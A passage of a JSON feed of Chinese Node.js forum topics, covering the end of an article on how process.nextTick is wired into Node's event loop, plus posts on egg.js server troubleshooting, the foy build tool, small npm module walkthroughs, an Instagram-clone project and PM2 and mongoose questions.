handles，无需多言。其中的callback调用在<code>uv__finish_close()</code>中</p>\n<h2>process.nextTick在哪里</h2>\n<p>文档中提到<code>process.nextTick()</code>不属于上面的任何一个phase，它在每个phase结束的时候都会运行。但是我们看到<code>uv_run()</code>中只是依次运行了6个phase的函数，并没有<code>process.nextTick()</code>影子，那它是怎么被驱动起来的呢？<br>\n这个问题要从两个c++和js的源码层面来说明。</p>\n<h3>process.nextTick在js层面的实现</h3>\n<p><code>process.nextTick</code>的实现在next_tick.js中</p>\n<pre class=\"prettyprint language-javascript\"><code>  function nextTick(callback) {\n    if (typeof callback !== &#x27;function&#x27;)\n      throw new errors.TypeError(&#x27;ERR_INVALID_CALLBACK&#x27;);\n\n    if (process._exiting)\n      return;\n\n    var args;\n    switch (arguments.length) {\n      case 1: break;\n      case 2: args = [arguments[1]]; break;\n      case 3: args = [arguments[1], arguments[2]]; break;\n      case 4: args = [arguments[1], arguments[2], arguments[3]]; break;\n      default:\n        args = new Array(arguments.length - 1);\n        for (var i = 1; i &lt; arguments.length; i++)\n          args[i - 1] = arguments[i];\n    }\n\n    push(new TickObject(callback, args, getDefaultTriggerAsyncId()));&#x2F;&#x2F;将callback封装为一个对象放入队列中\n  }\n</code></pre><p>它并没有什么魔法，也没有调用C++提供的函数，只是简单地将所有回调封装为对象并放入队列。而callback的执行是在函数<code>_tickCallback()</code></p>\n<pre class=\"prettyprint language-javascript\"><code>  function _tickCallback() {\n    let tock;\n    do {\n      while (tock = shift()) {\n        const asyncId = tock[async_id_symbol];\n        emitBefore(asyncId, tock[trigger_async_id_symbol]);\n        if (destroyHooksExist())\n          emitDestroy(asyncId);\n\n        const callback = tock.callback;\n        if (tock.args === undefined)\n          callback();&#x2F;&#x2F;执行调用process.nextTick()时放置进来的callback\n        else\n          Reflect.apply(callback, undefined, tock.args);&#x2F;&#x2F;执行调用process.nextTick()时放置进来的callback\n\n        emitAfter(asyncId);\n      }\n      runMicrotasks();&#x2F;&#x2F;microtasks将会在此时执行，例如Promise\n    } while (head.top !== head.bottom || emitPromiseRejectionWarnings());\n    tickInfo[kHasPromiseRejections] = 0;\n  }\n</code></pre><p>可以看到<code>_tickCallback()</code>会循环执行队列中所有callback，值得注意的是microtasks的执行时机， 因此<code>_tickCallback()</code>的执行就意味着<code>process.nextTick()</code>的回调的执行。我们继续搜索一下发现<code>_tickCallback()</code>在好几个地方都有被调用，但是我们只关注跟event loop相关的。<br>\n在next_tick.js中发现</p>\n<pre class=\"prettyprint language-javascript\"><code>  const [\n    tickInfo,\n    runMicrotasks\n  ] = process._setupNextTick(_tickCallback);\n</code></pre><p>查找了一下发现在node.cc中有</p>\n<pre class=\"prettyprint language-C++\"><code>env-&gt;SetMethod(process, &quot;_setupNextTick&quot;, SetupNextTick);&#x2F;&#x2F;暴露_setupNextTick给js\n</code></pre><p><code>_setupNextTick()</code>是node.cc那边暴露出来的方法，因此猜测这就是连接event loop的桥梁。</p>\n<h3>c++中执行process.nextTick的回调</h3>\n<p>在node.cc中找出<code>SetupNextTick()</code>函数，有这样的代码片段</p>\n<pre class=\"prettyprint language-C++\"><code>void SetupNextTick(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {\n  Environment* env = Environment::GetCurrent(args);\n\n  CHECK(args[0]-&gt;IsFunction());\n  &#x2F;&#x2F;把js中提供的回调函数（即_tickCallback）保存起来，以供调用\n  env-&gt;set_tick_callback_function(args[0].As&lt;Function&gt;());\n  ...\n}\n</code></pre><p><code>_tickCallback</code>被放置到env里面去了，那它何时被调用？也是在node.cc中我们发现</p>\n<pre class=\"prettyprint language-C++\"><code>void InternalCallbackScope::Close() {\n  if (!tick_info-&gt;has_scheduled()) {\n    env_-&gt;isolate()-&gt;RunMicrotasks();\n  }\n  &#x2F;&#x2F;...\n  &#x2F;&#x2F;终于调用在SetupNextTick()中放置进来的函数了\n  if (env_-&gt;tick_callback_function()-&gt;Call(process, 0, nullptr).IsEmpty()) {\n    env_-&gt;tick_info()-&gt;set_has_thrown(true);\n    failed_ = true;\n  }\n}\n</code></pre><p>可知<code>InternalCallbackScope::Close()</code>会调用它，而<code>InternalCallbackScope::Close()</code>则在文件node.cc的<code>InternalMakeCallback()</code>中被调用</p>\n<pre class=\"prettyprint language-C++\"><code>MaybeLocal&lt;Value&gt; InternalMakeCallback(Environment* env,\n                                       Local&lt;Object&gt; recv,\n                                       const Local&lt;Function&gt; callback,\n                                       int argc,\n                                       Local&lt;Value&gt; argv[],\n                                       async_context asyncContext) {\n  CHECK(!recv.IsEmpty());\n  InternalCallbackScope scope(env, recv, asyncContext);\n  &#x2F;&#x2F;...\n  scope.Close();&#x2F;&#x2F;Close会调用_tickCall\n  &#x2F;&#x2F;...\n}\n</code></pre><p>而<code>InternalMakeCallback()</code>则是在async_wrap.cc的<code>AsyncWrap::MakeCallback()</code>中被调用</p>\n<pre class=\"prettyprint language-C++\"><code>MaybeLocal&lt;Value&gt; AsyncWrap::MakeCallback(const Local&lt;Function&gt; cb,\n                                          int argc,\n                                          Local&lt;Value&gt;* argv) {\n  &#x2F;&#x2F;cb就是在event loop的6个phase中执行的回调函数\n  MaybeLocal&lt;Value&gt; ret = InternalMakeCallback(env(), object(), cb, argc, argv, context);\n}\n</code></pre><p>AsyncWrap类是异步操作的封装，它是一个顶级的类，TimerWrap、TcpWrap等封装异步的类都继承了它，这意味着这些类封装异步操作的时候都会调用<code>MakeCallback()</code>。至此真相大白了，<code>uv_run()</code>中的回调都是经过<code>AsyncWrap::MakeCallback()</code>包装过的，因此回调执行完毕之后都会执行<code>process.nextTick()</code>的回调了，与文档的描述是相符合的。整理一下<code>_tickCallback()</code>的转移并最终被调用的流程</p>\n<p>在js层面</p>\n<pre class=\"prettyprint language-JAVASCRIPT\"><code>_tickCallback()&#x2F;&#x2F;js中执行process.nextTick()的回调函数\n\t\t↓\nprocess._setupNextTick(_tickCallback)\t\t&#x2F;&#x2F;c++和js的桥梁，将回调交给C++执行\n\n</code></pre><p>此时<code>_tickCallback()</code>被转移到在C++层面，它首先被存储到env中</p>\n<pre class=\"prettyprint language-C++\"><code>env-&gt;set_tick_callback_function()&#x2F;&#x2F;将_tickCallback存储到env中\n        ↓\t\t\nenv-&gt;SetMethod(process, &quot;_setupNextTick&quot;, SetupNextTick);&#x2F;&#x2F;调用上者，js中process._setupNextTick的真身\n</code></pre><p>被存储到env的<code>_tickCallback()</code>被调用流程如下：</p>\n<pre class=\"prettyprint language-C++\"><code>env_-&gt;tick_callback_function()&#x2F;&#x2F;取出_tickCallback执行\n        ↓\nInternalCallbackScope::Close()&#x2F;&#x2F;调用前者\n        ↓  \nInternalMakeCallback()&#x2F;&#x2F;调用前者   \n        ↓  \nAsyncWrap::MakeCallback()&#x2F;&#x2F;调用前者   \n        ↓  \n被多个封装异步操作的类继承并调用\n        ↓\n被uv_run()执行，从而实现在每个phase之后调用process.nextTick提供的回调\t\n</code></pre><p>整个过程分析得比较粗糙，后面其实很多细节没去寻找，不过大家可以从以下的参考资料补全其它细节。例如timer的整个执行流程可以看<br>\n<a href=\"https://github.com/xtx1130/blog/issues/15\">《从./lib/timers.js来看timers相关API底层实现》</a>，是对我没提及地方的一个良好补充。</p>\n<h1>参考资料</h1>\n<p>由于node发展非常迅猛，很多早期的源码分析已经过时（源码的目录结构或者实现代码已经改变），不过还是很有指导意义。</p>\n<ul>\n<li><a href=\"http://acemood.github.io/2016/02/01/event-loop-in-javascript/\">Event loop in JavaScrip</a>：启迪我找到答案的最为关键的文章</li>\n<li><a href=\"https://www.ibm.com/developerworks/cn/opensource/os-cn-v8engine/\">使用 Google V8 引擎开发可定制的应用程序</a>：这篇文章介绍了v8引擎暴露C++对象给js的方法，对读懂node源码非常有帮助</li>\n<li><a href=\"https://github.com/yjhjstz/deep-into-node\">深入理解Node.js：核心思想与源码分析</a>：对node源码的一个全面分析，基于node 6.0</li>\n<li><a href=\"https://github.com/xtx1130/blog\">node 源码粗读系列</a>：基于9.0的源码分析，非常详细且跟上了最新变化</li>\n<li><a href=\"https://cnodejs.org/topic/55a76cf95d5240f223494f31\">Node.js挖掘系列</a></li>\n<li><a href=\"https://cnodejs.org/topic/56e3dfde545c5c736d12383f\">node源码详解系列</a></li>\n</ul>\n</div>","title":"不要混淆nodejs和浏览器中的event loop","last_reply_at":"2018-12-05T15:13:24.630Z","good":true,"top":false,"reply_count":47,"visit_count":21932,"create_at":"2018-02-24T06:40:23.236Z","author":{"loginname":"youth7","avatar_url":"https://avatars2.githubusercontent.com/u/8315732?v=4&s=120"}},{"id":"5c06be08d3b8ab334e8dac2c","author_id":"57073ca50928c91f1e7784c2","tab":"ask","content":"<div class=\"markdown-text\"><p>需求如下：\n1、不折腾，keystone、express、koa 这种虽说开发成本不高，但是产品化之后安全、运维都相当麻烦；\n2、基于 Node，不选 wordpress 这种是因为 php 只停留在 Hello World 上，出问题太麻烦；\n3、支持登录、注册、找回密码、邮件支持、数据库支持，不要静态生成类的；\n4、SEO 友好，不是 MVVM 结构的或者支持 SSR 类的；</p>\n<p>求各位大佬推荐。</p>\n</div>","title":"求推荐一款基于 Node 不折腾的 CMS","last_reply_at":"2018-12-05T13:20:01.489Z","good":false,"top":false,"reply_count":7,"visit_count":1226,"create_at":"2018-12-04T17:48:56.787Z","author":{"loginname":"Lucassssss","avatar_url":"https://avatars0.githubusercontent.com/u/5128154?v=3&s=120"}},{"id":"5c0622ad1c62d83349350837","author_id":"51d37c80d44cbfa304285441","tab":"ask","content":"<div class=\"markdown-text\"><p>我在一台测试的阿里云服务器上（1核cpu, 2 G内存,  CentOS 7.4 64位）使用<code>egg-scripts start</code> 运行了 13个 egg.js 的项目。\n然后就开始持续的某些项目会自动关闭。</p>\n<pre class=\"prettyprint\"><code>$netstat -tunlp\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name    \ntcp        0      0 127.0.0.1:40954         0.0.0.0:*               LISTEN      14117&#x2F;node          \ntcp        0      0 127.0.0.1:38938         0.0.0.0:*               LISTEN      14133&#x2F;node          \ntcp        0      0 127.0.0.1:7002          0.0.0.0:*               LISTEN      1686&#x2F;node           \ntcp        0      0 127.0.0.1:7101          0.0.0.0:*               LISTEN      21578&#x2F;node          \ntcp        0      0 127.0.0.1:3101          0.0.0.0:*               LISTEN      4616&#x2F;node           \ntcp        0      0 127.0.0.1:3102          0.0.0.0:*               LISTEN      24280&#x2F;node          \ntcp        0      0 127.0.0.1:7102          0.0.0.0:*               LISTEN      30380&#x2F;node          \ntcp        0      0 127.0.0.1:32000         0.0.0.0:*               LISTEN      16685&#x2F;java          \ntcp        0      0 127.0.0.1:43392         0.0.0.0:*               LISTEN      15767&#x2F;node          \ntcp        0      0 127.0.0.1:7008          0.0.0.0:*               LISTEN      5790&#x2F;node           \ntcp        0      0 127.0.0.1:33761         0.0.0.0:*               LISTEN      20628&#x2F;node          \ntcp        0      0 127.0.0.1:7009          0.0.0.0:*               LISTEN      8403&#x2F;node           \ntcp        0      0 127.0.0.1:35042         0.0.0.0:*               LISTEN      8595&#x2F;node           \ntcp        0      0 127.0.0.1:7011          0.0.0.0:*               LISTEN      6817&#x2F;node           \ntcp        0      0 127.0.0.1:43237         0.0.0.0:*               LISTEN      14823&#x2F;node          \ntcp        0      0 127.0.0.1:37381         0.0.0.0:*               LISTEN      13771&#x2F;node          \ntcp        0      0 127.0.0.1:7013          0.0.0.0:*               LISTEN      8537&#x2F;node           \ntcp        0      0 127.0.0.1:45445         0.0.0.0:*               LISTEN      24286&#x2F;node          \ntcp        0      0 127.0.0.1:44006         0.0.0.0:*               LISTEN      10339&#x2F;node          \ntcp        0      0 127.0.0.1:44294         0.0.0.0:*               LISTEN      13705&#x2F;node          \ntcp        0      0 127.0.0.1:7015          0.0.0.0:*               LISTEN      5008&#x2F;node           \ntcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      1578&#x2F;redis-server 1 \ntcp        0      0 127.0.0.1:39084         0.0.0.0:*               LISTEN      32417&#x2F;node          \ntcp        0      0 127.0.0.1:32846         0.0.0.0:*               LISTEN      27467&#x2F;node          \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      3152&#x2F;nginx: master  \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1571&#x2F;sshd           \ntcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      14126&#x2F;node          \ntcp        0      0 127.0.0.1:7000          0.0.0.0:*               LISTEN      18806&#x2F;node          \nudp        0      0 172.18.163.223:123      0.0.0.0:*                           456&#x2F;ntpd            \nudp        0      0 127.0.0.1:123           0.0.0.0:*                           456&#x2F;ntpd            \nudp        0      0 0.0.0.0:123             0.0.0.0:*                           456&#x2F;ntpd            \nudp6       0      0 :::123                  :::*                                456&#x2F;ntpd \n</code></pre><p>查看</p>\n<pre class=\"prettyprint\"><code>$free\n              total        used        free      shared  buff&#x2F;cache   available\nMem:        1882736     1639432      110384         584      132920       91400\nSwap:             0           0           0\n</code></pre><p>查看</p>\n<pre class=\"prettyprint\"><code>$top\n PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                                                                                                                    \n16685 root      20   0 2057540  58664   1748 S  1.3  3.1   1:10.59 java                                                                                                                                       \n 1225 root      20   0  129760   3152    944 S  0.3  0.2  42:45.29 AliYunDun                                                                                                                                  \n 8420 root      20   0 1106180  44192   2088 S  0.3  2.3   0:04.17 node                                                                                                                                       \n 8595 root      20   0 1222192  41316   4748 S  0.3  2.2   0:19.50 node                                                                                                                                       \n17687 root      20   0 1229388  55084   4516 S  0.3  2.9   0:03.79 node                                                                                                                                       \n    1 root      20   0   43388   2312   1128 S  0.0  0.1   0:13.30 systemd                                                                                                                                    \n    2 root      20   0       0      0      0 S  0.0  0.0   0:00.85 kthreadd                                                                                                                                   \n    3 root      20   0       0      0      0 S  0.0  0.0   0:16.02 ksoftirqd&#x2F;0                                                                                                                                \n    5 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kworker&#x2F;0:0H \n</code></pre><p>看资源也不是占得比较多，各位大大请问问题是在哪里？</p>\n</div>","title":"egg-scripts start 的egg 项目有上限吗？突然某些项目会自动关闭？为什么？","last_reply_at":"2018-12-05T12:46:26.817Z","good":false,"top":false,"reply_count":7,"visit_count":862,"create_at":"2018-12-04T06:46:05.350Z","author":{"loginname":"thomas0836","avatar_url":"https://avatars2.githubusercontent.com/u/3435615?v=4&s=120"}},{"id":"5c07c29b15a4d545e3f4b907","author_id":"576544fd02d0ee4b6d8a3e54","tab":"share","content":"<div class=\"markdown-text\"><p>npm 的 scripts 下写的命令太多就很容易很乱，各种第三方轮子都只能解决一部分问题，总感觉不是很好用，想找个类似 make 的工具只能找到 jake, 可是 jake 的 API 太老，居然很多都不支持 promise, 代码也不多，就干脆自己造轮子了, 感觉效果还行。</p>\n<p>项目地址: <a href=\"https://github.com/zaaack/foy\">https://github.com/zaaack/foy</a></p>\n<h3>特点:</h3>\n<ul>\n<li>基于 promise 的任务和内置工具函数(fs/shell), 无缝支持 async/await</li>\n<li>类似于 shelljs 的跨平台 shell dsl, 人人都会写 shell</li>\n<li>易学易用，无需为写仅仅几个 build 命令而花费几个小时去寻找和学习第三方包</li>\n<li>很小的安装成本\n<ul>\n<li>foy: <a href=\"https://packagephobia.now.sh/result?p=foy\"><img src=\"https://camo.githubusercontent.com/e322203961962839780cbe44499a669b08e3deb3/68747470733a2f2f7061636b61676570686f6269612e6e6f772e73682f62616467653f703d666f79\" alt=\"install size\"></a></li>\n<li>gulp: <a href=\"https://packagephobia.now.sh/result?p=gulp\"><img src=\"https://camo.githubusercontent.com/509352b6dd1e40a07c61a4ec5cc99aaee0f8afaf/68747470733a2f2f7061636b61676570686f6269612e6e6f772e73682f62616467653f703d67756c70\" alt=\"install size\"></a></li>\n<li>grunt: <a href=\"https://packagephobia.now.sh/result?p=grunt\"><img src=\"https://camo.githubusercontent.com/087d857351551b8a505e1224c9f3c78ccc0d98e2/68747470733a2f2f7061636b61676570686f6269612e6e6f772e73682f62616467653f703d6772756e74\" alt=\"install size\"></a></li>\n</ul>\n</li>\n<li>无缝和第三方支持 promise 的工具包整合，不需要封装成插件就能用</li>\n</ul>\n<p><img src=\"https://github.com/zaaack/foy/raw/master/docs/capture.gif?raw=true\" alt></p>\n<h3>使用:</h3>\n<p>安装</p>\n<pre class=\"prettyprint\"><code>yarn add -D foy # or npm i -D foy\n\n# Or Install globally with\n\nyarn add -g foy # or npm i -g foy\n\n</code></pre><p>在项目根目录下增加一个 Foyfile.js (或者 Foyfile.ts, 需要安装 <a href=\"https://github.com/TypeStrong/ts-node\">ts-node</a>)</p>\n<pre class=\"prettyprint\"><code>import { task, desc, option, strict, fs } from &#x27;foy&#x27;\n\n\ntask(&#x27;build&#x27;, async ctx =&gt; {\n  await ctx.exec(&#x27;tsc&#x27;)\n})\n\ndesc(&#x27;Build ts files with tsc&#x27;)\noption(&#x27;-w, --watch&#x27;, &#x27;watch file changes&#x27;)\nstrict() &#x2F;&#x2F; This will throw an error if you passed some options that doesn&#x27;t defined via &#96;option()&#96;\ntask(&#x27;build2&#x27;, async ctx =&gt; {\n  await ctx.exec(&#96;tsc ${ctx.options.watch ? &#x27;-w&#x27; : &#x27;&#x27;}&#96;)\n})\n\ntask(&#x27;task&#x27;, async ctx =&gt; {\n  await fs.rmrf(&#x27;&#x2F;some&#x2F;dir&#x2F;or&#x2F;file&#x27;) &#x2F;&#x2F; Remove directory or file\n  await fs.copy(&#x27;&#x2F;src&#x27;, &#x27;&#x2F;dist&#x27;) &#x2F;&#x2F; Copy folder or file\n  let json = await fs.readJson(&#x27;.&#x2F;xx.json&#x27;)\n  await ctx.env(&#x27;NODE_ENV&#x27;, &#x27;production&#x27;)\n  await ctx.cd(&#x27;.&#x2F;src&#x27;)\n  await ctx.exec(&#x27;some command&#x27;) &#x2F;&#x2F; Execute an command\n  let { stdout } = await ctx.exec(&#x27;ls&#x27;, { stdio: &#x27;pipe&#x27; }) &#x2F;&#x2F; Get the stdout, default is empty because it&#x27;s redirected to current process via &#96;stdio: &#x27;inherit&#x27;&#96;.\n})\n\n</code></pre><p>然后就可以运行任务了</p>\n<pre class=\"prettyprint\"><code># 安装在本地 node_modules 目录下\nnpx foy build\nnpx foy build1\nnpx foy task \n\n# 安装在全局\n\nfoy build\nfoy build1\n\n</code></pre></div>","title":"foy: 基于 nodejs 的轻量级通用 build 工具","last_reply_at":"2018-12-05T12:20:43.513Z","good":false,"top":false,"reply_count":0,"visit_count":775,"create_at":"2018-12-05T12:20:43.512Z","author":{"loginname":"zaaack","avatar_url":"https://avatars3.githubusercontent.com/u/5233940?v=4&s=120"}},{"id":"5c07310f1c62d83349350dc0","author_id":"57067a058265278d59c7e61f","tab":"share","content":"<div class=\"markdown-text\"><h2>1、git地址</h2>\n<p><a href=\"https://github.com/jonschlinkert/array-first\">https://github.com/jonschlinkert/array-first</a></p>\n<h2>2、作用</h2>\n<p>获取数组第一个或者前几个元素</p>\n<h2>3、例子和源码解析</h2>\n<h3>3.1 例子</h3>\n<pre class=\"prettyprint language-javascript\"><code>const first = require(&#x27;array-first&#x27;);\n\nconsole.log(first([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;])) &#x2F;&#x2F; 输出：a\n\nconsole.log(first([&#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;], 1)) &#x2F;&#x2F; 输出：d\n\nconsole.log(first([&#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;], 2)) &#x2F;&#x2F; 输出：[&#x27;d&#x27;, &#x27;e&#x27;]\n\nconsole.log(first([], 2)) &#x2F;&#x2F; 输出：null\n\nconsole.log(first(&#x27;&#x27;, 2)) &#x2F;&#x2F; 输出：暴露异常Error: array-first expects an array as the first argument.\n\nconsole.log(first([1, 2, 3], &#x27;3&#x27;)) &#x2F;&#x2F; 输出：[1, 2, 3]\n\nconsole.log(first([1, 2, 3], &#x27;&#x27;)) &#x2F;&#x2F; 输出：[1]\n\nconsole.log(first([1, 2, 3], null)) &#x2F;&#x2F; 输出：1\n\nconsole.log(first([1, 2, 3], undefined)) &#x2F;&#x2F; 输出：1\n</code></pre><h3>3.2 源码</h3>\n<pre class=\"prettyprint language-javascript\"><code>var isNumber = require(&#x27;is-number&#x27;);\nvar slice = require(&#x27;array-slice&#x27;);\n\nmodule.exports = function arrayFirst(arr, num) {\n  if (!Array.isArray(arr)) {\n    throw new Error(&#x27;array-first expects an array as the first argument.&#x27;);\n  }\n\n  if (arr.length === 0) {\n    return null;\n  }\n\n  var first = slice(arr, 0, isNumber(num) ? +num : 1);\n  if (+num === 1 || num == null) {\n    return first[0];\n  }\n  return first;\n};\n</code></pre><h3>3.3 源码解析</h3>\n<p>1）暴露出去的函数有两个参数，分别是数组和获取元素的个数；</p>\n<p>2）如果传入的不是数组，那么就会暴露类型错误的异常；</p>\n<p>3）如果传入的是空数组，那么就会返回null；</p>\n<p>4）接着通过slice函数截取第一个元素。如果未传入num或者num不是数字类型，那么默认截取1个元素；如果\bnum是大于1的数字类型，那么就截取长度为num的数组。</p>\n<p>5）如果num是1或者null类型，那么就截取数组第一个元素，返回的是一个元素。否则返回num长度的数组。</p>\n</div>","title":"npm模块学习之array-first","last_reply_at":"2018-12-05T10:11:37.285Z","good":false,"top":false,"reply_count":7,"visit_count":677,"create_at":"2018-12-05T01:59:43.294Z","author":{"loginname":"sunfeng90","avatar_url":"https://avatars1.githubusercontent.com/u/11543206?v=4&s=120"}},{"id":"5c034ecb39c0af64fddb7c41","author_id":"5bc2eae715e4fd1923f48ebb","tab":"share","content":"<div class=\"markdown-text\"><h2>简介</h2>\n<p><strong>Hello 小伙伴们，如果觉得本文还不错，记得给个 star，你们 star 是我编写更多更丰富开源项目的动力！\n<a href=\"https://github.com/zhoushaw/Instagram\">GitHub 地址</a></strong></p>\n<blockquote>\n<p>技术栈</p>\n</blockquote>\n<ul>\n<li>react全家桶</li>\n<li>typescript</li>\n<li>ant design</li>\n<li>egg.js</li>\n<li>mysql</li>\n</ul>\n<p>\b前后端分离开发模式，前端项目与后端项目属于不同的工程</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; instagram&#x2F;client 前端工程\n&#x2F;&#x2F; instagram&#x2F;service 后端工程\n</code></pre><p>注：此项目纯属个人瞎搞，与instagram无任何关系。</p>\n<h2>部分功能截图</h2>\n<blockquote>\n<p>登录</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/12/1/16769229233487ec?w=419&amp;h=264&amp;f=gif&amp;s=903361\" alt=\"avatar\"></p>\n<blockquote>\n<p>关注</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/12/1/1676922921ea71d4?w=600&amp;h=377&amp;f=gif&amp;s=973224\" alt=\"avatar\"></p>\n<blockquote>\n<p>发帖</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/12/1/167692291f1c3d2b?w=419&amp;h=264&amp;f=gif&amp;s=2106389\" alt=\"avatar\"></p>\n<blockquote>\n<p>点赞、评论、搜索</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/12/1/167692291fdc37c2?w=419&amp;h=264&amp;f=gif&amp;s=847493\" alt=\"avatar\"></p>\n<blockquote>\n<p>修改个人信息</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/12/1/167692291cf31011?w=600&amp;h=377&amp;f=gif&amp;s=1680299\" alt=\"avatar\"></p>\n<h2>运行项目</h2>\n<p>因前后端不同端口原因，为解决跨域。前端\b工程启动了devServer，需先启动后端工程</p>\n<ul>\n<li>git clone <a href=\"https://github.com/zhoushaw/Instagram.git\">https://github.com/zhoushaw/Instagram.git</a></li>\n<li>cd Instagram</li>\n</ul>\n<blockquote>\n<p>运行后端项目</p>\n</blockquote>\n<ul>\n<li>请确保本地已装mysql，并配置全局变量</li>\n<li>mysql -u root -p 并输入数据库密码</li>\n<li>create database learn; 创建learn数据库</li>\n<li>use learn;  切换数据库</li>\n<li>source learn.sql的路径; 例如：source /Users/shawzhou/Desktop/learning/instagram/db/learn.sql;</li>\n<li>配置egg.js连接数据库信息</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 前往service&#x2F;config&#x2F;config.local.ts，配置你的数据库信息\nconfig.sequelize = {\n    dialect: &#x27;mysql&#x27;,\n    host: &#x27;127.0.0.1&#x27;,\n    port: 3306,\n    database: &#x27;learn&#x27;,\n    username: &#x27;&#x27;, \n    password: &#x27;&#x27;, \n    operatorsAliases: false\n};\n</code></pre><ul>\n<li>配置七牛云上传鉴权信息</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>\n&#x2F;&#x2F; 前往&#x2F;service&#x2F;app&#x2F;service&#x2F;qiniu.ts，配置你的七牛云获取token信息\nexport default class qiniuService extends Service {\n    &#x2F;&#x2F; 前往七牛云的个人面板=&gt;秘钥管理查看\n    private accessKey: string = &#x27;&#x27;; &#x2F;&#x2F; 秘钥\n    private secretKey: string = &#x27;&#x27;; &#x2F;&#x2F; 秘钥\n    private publicBucketDomain = &#x27;&#x27;; &#x2F;&#x2F; 外链默认域名\n\n    private options: qiniuOptioin = {\n        scope: &#x27;&#x27;, &#x2F;&#x2F; 上传空间\n        expires: 7200\n    }\n\n    &#x2F;&#x2F; ....\n}\n\n&#x2F;&#x2F; 七牛云存储空间区设置，前往&#x2F;client&#x2F;src&#x2F;components&#x2F;upload&#x2F;index.js，配置上传区\nclass Upload extends React.Component{\n\n\n    uploadFn = async () =&gt; {\n        &#x2F;&#x2F; ...\n        var config = {\n            region: qiniu.region.z0 &#x2F;&#x2F; 所属区，可前往七牛云文档查看\n        };\n        &#x2F;&#x2F; ...\n}\n</code></pre><ul>\n<li>在/service文件下</li>\n<li>npm install</li>\n<li>npm run dev</li>\n</ul>\n<blockquote>\n<p>\b运行前端项目</p>\n</blockquote>\n<ul>\n<li>cd client</li>\n<li>npm install</li>\n<li>npm start</li>\n</ul>\n<h2>目标功能</h2>\n<ul>\n<li>[x] 登录、注册    – 完成</li>\n<li>[x] 修改个人信息  --完成</li>\n<li>[x] 关注  – 完成</li>\n<li>[x] 登录、注册    – 完成</li>\n<li>[x] 修改个人信息  --完成</li>\n<li>[x] 关注  – 完成</li>\n<li>[x] 点赞  – 完成</li>\n<li>[x] 搜索帖子  – 完成</li>\n<li>[x] 上传头像  – 完成</li>\n<li>[x] 发帖  – 完成</li>\n<li>[x] 收藏  – 未完成</li>\n</ul>\n<p><strong>后记：小伙伴们，如果觉得本文还不错，记得给个 star，你们star 是我编写更多更丰富开源项目的动力！\n<a href=\"https://github.com/zhoushaw/Instagram\">GitHub 地址</a></strong></p>\n</div>","title":"打造属于你自己的instagram! (react+egg.js全栈项目)","last_reply_at":"2018-12-05T09:13:03.344Z","good":false,"top":false,"reply_count":13,"visit_count":991,"create_at":"2018-12-02T03:17:31.836Z","author":{"loginname":"zhoushaw","avatar_url":"https://avatars0.githubusercontent.com/u/27547179?v=4&s=120"}},{"id":"5c063bf41c62d83349350978","author_id":"5acd78cb042a804dc5196851","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/Fkg8GFGXI-z-Q8nHRSMnfBM6SoWG\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/FvaDmFsfOOvQ6bacVlv-uAviinMU\" alt=\"image.png\">\n这个message怎么通过res返回给前端？？</p>\n</div>","title":"mongoose validation errors ，这个errors如何通过res返回给前端？？","last_reply_at":"2018-12-05T09:00:50.853Z","good":false,"top":false,"reply_count":3,"visit_count":523,"create_at":"2018-12-04T08:33:56.721Z","author":{"loginname":"miuqiang","avatar_url":"https://avatars2.githubusercontent.com/u/19277011?v=4&s=120"}},{"id":"5c009022d6104a4f803a3068","author_id":"5aba15c3a2f3b49869cb2da2","tab":"ask","content":"<div class=\"markdown-text\"><p>示例如下：\n<img src=\"//static.cnodejs.org/Fhm0mgJ4fqPwh-yanXV2DXaC3FHa\" alt=\"1543479990(1).jpg\"></p>\n<p>PM2重启时能不能自定义这个restart的次数？查看了文档好久但是都没有看到相关信息。求指导？PM2 版本是V3.2.2</p>\n</div>","title":"PM2重启时能不能自定义重启次数？","last_reply_at":"2018-12-05T06:46:12.708Z","good":false,"top":false,"reply_count":12,"visit_count":985,"create_at":"2018-11-30T01:19:30.042Z","author":{"loginname":"zurmokeeper","avatar_url":"https://avatars2.githubusercontent.com/u/25943604?v=4&s=120"}},{"id":"5c073fbad3b8ab334e8dadd5","author_id":"57067a058265278d59c7e61f","tab":"share","content":"<div class=\"markdown-text\"><h2>1、git地址</h2>\n<p><a href=\"https://github.com/jonschlinkert/array-last\">https://github.com/jonschlinkert/array-last</a></p>\n<h2>2、作用</h2>\n<p>递归的合并一个或者多个数组到一个新数组</p>\n<h2>3、例子和源码解析</h2>\n<h3>3.1 例子</h3>\n<pre class=\"prettyprint language-javascript\"><code>const flatten = require(&#x27;arr-flatten&#x27;);\n\nconsole.log(flatten([1, 2, 3, 5, [[[[[8]]]]]])) &#x2F;&#x2F; 输出：[ 1, 2, 3, 5, 8 ]\n\nconsole.log(flatten([1, 2, 3, 5, [7]])) &#x2F;&#x2F; 输出：[ 1, 2, 3, 5, 7 ]\n\nconsole.log(flatten([1, 2, 3, 5, [null, [[[[[[[[10]]]]]]]]]])) &#x2F;&#x2F; 输出：[ 1, 2, 3, 5, null, 10 ]\n</code></pre><h3>3.2 源码</h3>\n<pre class=\"prettyprint language-javascript\"><code>module.exports = function (arr) {\n  return flat(arr, 